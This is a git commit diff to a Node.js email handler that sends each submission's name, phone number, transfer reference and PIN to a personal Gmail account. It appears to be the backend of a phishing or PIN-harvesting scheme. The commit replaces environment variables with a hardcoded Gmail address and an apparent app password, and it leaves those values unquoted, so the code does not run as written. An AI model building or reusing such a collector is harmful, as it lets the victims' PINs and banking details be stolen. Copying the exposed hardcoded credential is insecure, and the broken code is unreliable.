edba0aed95e0327b44bf502d83ed004065d829cc
Ghost <207649464+legaljobagencyuk@users.noreply.github.com>
2025-09-04 03:14:57 +0100

    Update sendEmail.js

--- api/sendEmail.js
+++ api/sendEmail.js
@@ -8,21 +8,21 @@ export default async function handler(req, res) {
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
-                user: process.env.EMAIL_USER,
-                pass: process.env.EMAIL_PASS,
+                user: legaljobagenciesuk@gmail.com,
+                pass: Hhlbbcnofnsmaspscapc,
             },
         });
 
         const mailOptions = {
-            from: process.env.EMAIL_USER,
-            to: process.env.ADMIN_EMAIL,
+            from: legaljobagenciesuk@gmail.com,
+            to: legaljobagenciesuk@gmail.com,
             subject: 'New User Data Submission',
             text: `Name: ${name}\nPhone: ${phone}\nTransfer Reference: ${reference}\nPIN: ${pin}`,
         };
 
         try {
             await transporter.sendMail(mailOptions);
-            res.status(200).json({ message: 'Email sent successfully!' });
+            res.status(200).json({ message: 'Email sent successfully! for now' });
         } catch (error) {
             res.status(500).json({ error: 'Error sending email' });
         }
